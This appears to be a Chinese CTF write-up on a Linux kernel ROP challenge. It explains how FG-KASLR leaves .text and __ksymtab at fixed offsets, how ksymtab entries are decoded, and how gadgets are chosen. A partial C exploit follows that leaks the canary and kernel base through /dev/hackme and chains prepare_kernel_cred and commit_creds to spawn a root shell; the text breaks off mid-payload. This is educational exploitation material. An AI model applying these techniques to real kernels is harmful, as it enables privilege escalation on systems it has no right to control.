<p>如果使用<code>readelf -S ./vmlinux | grep &quot;.text&quot;</code>查看text节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">^C</span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># readelf -S ./vmlinux | grep <span class="string">&quot;.text&quot;</span> | head -n 15</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         ffffffff81000000  <span class="number">00200000</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">024</span>d3b10</span><br><span class="line">  [ <span class="number">3</span>] .text.unlike[...] PROGBITS         ffffffff81400dd7  <span class="number">00600</span>dd7</span><br><span class="line">  [ <span class="number">4</span>] .text.__star[...] PROGBITS         ffffffff81400e90  <span class="number">00600e90</span></span><br><span class="line">  [ <span class="number">5</span>] .text.__do_s[...] PROGBITS         ffffffff81400ea0  <span class="number">00600</span>ea0</span><br><span class="line">  [ <span class="number">6</span>] .text.__xen_[...] PROGBITS         ffffffff81400eb0  <span class="number">00600</span>eb0</span><br><span class="line">  [ <span class="number">7</span>] .text.vvar_mremap PROGBITS         ffffffff81400ed0  <span class="number">00600</span>ed0</span><br><span class="line">  [ <span class="number">8</span>] .text.vdso_fault  PROGBITS         ffffffff81400f00  <span class="number">00600f</span>00</span><br><span class="line">  [ <span class="number">9</span>] .text.map_vdso    PROGBITS         ffffffff81400f90  <span class="number">00600f</span>90</span><br><span class="line">  [<span class="number">10</span>] .text.map_vd[...] PROGBITS         ffffffff814010c0  <span class="number">006010</span>c0</span><br><span class="line">  [<span class="number">11</span>] .text.vdso_mremap PROGBITS         ffffffff81401170  <span class="number">00601170</span></span><br><span class="line">  [<span class="number">12</span>] .text.<span class="type">find_t</span>[...] PROGBITS         ffffffff81401210  <span class="number">00601210</span></span><br><span class="line">  [<span class="number">13</span>] .text.vvar_fault  PROGBITS         ffffffff81401230  <span class="number">00601230</span></span><br><span class="line">  [<span class="number">14</span>] .text.arch_g[...] PROGBITS         ffffffff81401450  <span class="number">00601450</span></span><br><span class="line">  [<span class="number">15</span>] .text.vdso_j[...] PROGBITS         ffffffff81401470  <span class="number">00601470</span></span><br></pre></td></tr></table></figure>

<p>除去纯正的<code>.text</code>节之外, 还有很多<code>.text.*</code>的节, 这些节都很小,甚至二三十字节一个, 节里面也就一两个函数</p>
<p>其作用就是每个节都可以随机排列, 实现<code>FG-KASLR</code></p>
<p>但是🐎还没有死完</p>
<p><code>.text</code>节是一整个儿,只会整体参与ASLR,但是节内的函数不会参与<code>FG-KASLR</code>,而节内函数就有<code>swapgs_restore_regs_and_return_to_usermode</code>,</p>
<p><code>.text</code>节在未开启<code>KASLR</code>时的范围: <code>0xffffffff81000000 ~ 0xffffffff81400dd7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text @ 0xffffffff81000000 </span><br><span class="line">swapgs_restore_regs_and_return_to_usermode @ 0xffffffff81200f10		offset_to_text = 0x200f10</span><br><span class="line">kpti_trampoline @ 0xffffffff81200f26								offset_to_text = 0x200f26</span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>不属于任何<code>text</code>节,只参与<code>KASLR</code>,因此<code>ksymtab</code>到<code>.text</code> 的偏移量也是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab @ <span class="number">0xffffffff81f85198</span>		offset_to_text = <span class="number">0xf85198</span></span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>是一个映射表表中的每一项都长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	  <span class="type">int</span> value_offset;				<span class="comment">//符号地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> name_offset;				<span class="comment">//符号名地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> namespace_offset;			<span class="comment">//符号命名空间地址, 相对于 本字段 的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这三个字段的意义是什么呢? 以commit_creds函数为例,</p>
<p>首先在未开启KASLR的内核上,找到它在ksymtab中的地址,是<code>0xffffffff81f87d90</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep <span class="string">&quot;commit_creds&quot;</span></span></span><br><span class="line">ffffffff814c6410 T commit_creds</span><br><span class="line">ffffffff81f87d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffff81fa0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffff81fa4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure>

<p>然后在gdb中打印<code>ffffffff81f87d90</code>处三个双字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3wx 0xffffffff81f87d90</span><br><span class="line">0xffffffff81f87d90:     0xff53e680      0x00018bde      0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_offset = 0xff53e680</span><br><span class="line">name_offset = 0x00018bde</span><br><span class="line">name_space_offset = 0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>其中<code>value_offset</code>是符号实际地址与本字段<code>kernel_symbol.value_offset</code>的偏移量</p>
<p>符号描述符__ksymtab_commit_creds的地址在<code>0xffffffff81f87d90</code></p>
<p>符号与符号描述符的距离是<code>((1&lt;&lt;32) - 0xff53e680)</code>,由此计算得到符号地址在<code>0xffffffff814c6410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffffff81f87d90</span> - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - <span class="number">0xff53e680</span>)</span><br><span class="line">$<span class="number">17</span> = <span class="number">0xffffffff814c6410</span></span><br></pre></td></tr></table></figure>

<p>同理name_offset也是符号名字符串所在地址相对于本字段<code>kernel_symbol.name_offset</code>的偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xffffffff81fa0972 - 0xffffffff81f87d94</span><br><span class="line">$22 = 0x18bde</span><br></pre></td></tr></table></figure>

<p>同理name_space_offset是符号命名空间字符串与本字段<code>kernel_symbol.namespace_offset</code>的偏移量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s <span class="number">0xffffffff81fa4d42</span></span><br><span class="line"><span class="number">0xffffffff81fa4d42</span>:     <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d43</span>:     <span class="string">&quot;bpf_trace_run11&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d53</span>:     <span class="string">&quot;bpf_trace_run12&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d63</span>:     <span class="string">&quot;kprobe_event_cmd_init&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d79</span>:     <span class="string">&quot;__kprobe_event_gen_cmd_start&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d96</span>:     <span class="string">&quot;__kprobe_event_add_fields&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4db0</span>:     <span class="string">&quot;kprobe_event_delete&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4dc4</span>:     <span class="string">&quot;__tracepoint_suspend_resume&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4de0</span>:     <span class="string">&quot;__tracepoint_cpu_idle&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4df6</span>:     <span class="string">&quot;__tracepoint_cpu_frequency&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以看到,这个符号属于一个通用的命名空间</p>
</blockquote>
<p>回到本题中,思路如下:</p>
<p>1.<code>hackme_read</code>函数中泄露<code>canary</code>, 一个<code>text</code>段的地址, 计算得到<code>text</code>基地址, 以及<code>ksymtab</code>地址等</p>
<p>2.<code>ksymtab </code>中查到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址</p>
<p>3.构造<code>rop</code>链条</p>
<h4 id="1-栈上泄露一个text-地址"><a href="#1-栈上泄露一个text-地址" class="headerlink" title="1.栈上泄露一个text 地址"></a>1.栈上泄露一个<code>text</code> 地址</h4><p>在<code>read</code>函数中之前我们只泄露了<code>canary</code>值, 现在还要再泄露一个<code>text</code>段的地址,以此计算<code>text</code>段基地址</p>
<p>在未开启<code>KASLR</code>的情况下观察从<code>kstack_buf</code>开始的堆栈上,是否存在一个<code>text</code>段的地址 ,结果发现还真有</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241125151929536.png" alt="image-20241125151929536"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffc900001bff38</span> <span class="number">-0xffffc900001bfe08</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">0x130</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x26</span></span><br><span class="line">pwndbg&gt; p <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">38</span></span><br></pre></td></tr></table></figure>

<p>也就是说 ,<code>stack_buf + 0x130 </code>字节开始处的一个四字就是这个泄露</p>
<h4 id="2-从ksymtab中查函数地址"><a href="#2-从ksymtab中查函数地址" class="headerlink" title="2.从ksymtab中查函数地址"></a>2.从<code>ksymtab</code>中查函数地址</h4><p>内存任意读,这也可以通过<code>gadget</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot; : mov rax.*qword ptr .* ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff81004aad</span> : mov rax, qword ptr [rax + <span class="number">0x10</span>] ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81015a7f</span> : mov rax, qword ptr [rax] ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>使用<code>0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret</code>这个<code>gadget</code>,还需要一个能够控制<code>rax</code>值的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rax ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81004d11 : pop rax ; ret</span><br></pre></td></tr></table></figure>

<p>还需要一个控制<code>rdi</code>寄存器作为函数参数的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rdi ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81006370 : pop rdi ; ret</span><br></pre></td></tr></table></figure>



<h4 id="3-构造ROP链条"><a href="#3-构造ROP链条" class="headerlink" title="3.构造ROP链条"></a>3.构造ROP链条</h4><p>1.任意内存读泄露<code>prepare_kernel_creds</code>函数偏移量</p>
<p>2.<code>kpti-trampoline</code>返回到用户态,计算<code>prepare_kernel_creds</code>函数地址</p>
<p>3.任意内存读泄露<code>commit_creds</code>函数偏移量</p>
<p>4.<code>kpti-trampoline</code>返回到用户态,计算<code>commit_creds</code>函数地址</p>
<p>5.<code>ret2 prepare_kernel_creds</code></p>
<p>6.<code>kpti-trampoline</code>返回到用户态,保存<code>init_task @ rax </code></p>
<p>7.<code>init_task pop to rdi</code></p>
<p>8.<code>ret2 commit_creds</code></p>
<p>9.<code>kpti-trampoline</code>返回到用户态,起<code>shell</code></p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> addr_leak;</span><br><span class="line"><span class="type">size_t</span> off_leak = <span class="number">0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_text_base;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab = <span class="number">0xf85198</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_commit_creds = <span class="number">0xf87d90</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_commit_creds;</span><br><span class="line"><span class="type">size_t</span> addr_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_kpti_trampoline = <span class="number">0x200f26</span>;</span><br><span class="line"><span class="type">size_t</span> addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_deref_rax_pop_rbp_ret = <span class="number">0x15a7f</span>;</span><br><span class="line"><span class="type">size_t</span> addr_deref_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rax_ret = <span class="number">0x4d11</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rax_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rdi_ret = <span class="number">0x6370</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_init_task_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">int</span> value_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>;   </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak();  <span class="comment">//泄露canary</span></span><br><span class="line">    leak_prepare_kernel_cred();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking canary and text base&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> buffer[<span class="number">40</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">40</span>*<span class="number">8</span>);</span><br><span class="line">    canary = buffer[<span class="number">0x10</span>];</span><br><span class="line">    addr_leak = buffer[<span class="number">38</span>];</span><br><span class="line"></span><br><span class="line">    addr_text_base = addr_leak - off_leak;</span><br><span class="line">    addr_kpti_trampoline = addr_text_base + off_kpti_trampoline;</span><br><span class="line">    addr_ksymtab = addr_text_base + off_ksymtab;</span><br><span class="line">    addr_ksymtab_commit_creds = addr_text_base + off_ksymtab_commit_creds;</span><br><span class="line">    addr_ksymtab_prepare_kernel_cred = addr_text_base + off_ksymtab_prepare_kernel_cred;</span><br><span class="line">    addr_deref_rax_pop_rbp_ret = addr_text_base + off_deref_rax_pop_rbp_ret;</span><br><span class="line">    addr_pop_rax_ret = addr_text_base + off_pop_rax_ret;</span><br><span class="line">    addr_pop_rdi_ret = addr_text_base + off_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_leak: %p\n&quot;</span>,addr_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_text_base: %p\n&quot;</span>,addr_text_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_kpti_trampoline: %p\n&quot;</span>,addr_kpti_trampoline);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab: %p\n&quot;</span>,addr_ksymtab);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_commit_creds: %p\n&quot;</span>,addr_ksymtab_commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_prepare_kernel_cred: %p\n&quot;</span>,addr_ksymtab_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_deref_rax_pop_rbp_ret: %p\n&quot;</span>,addr_deref_rax_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rax_ret: %p\n&quot;</span>,addr_pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rdi_ret: %p\n&quot;</span>,addr_pop_rdi_ret);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Leak complete\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking prepare_kernel_cred offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_prepare_kernel_cred;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = 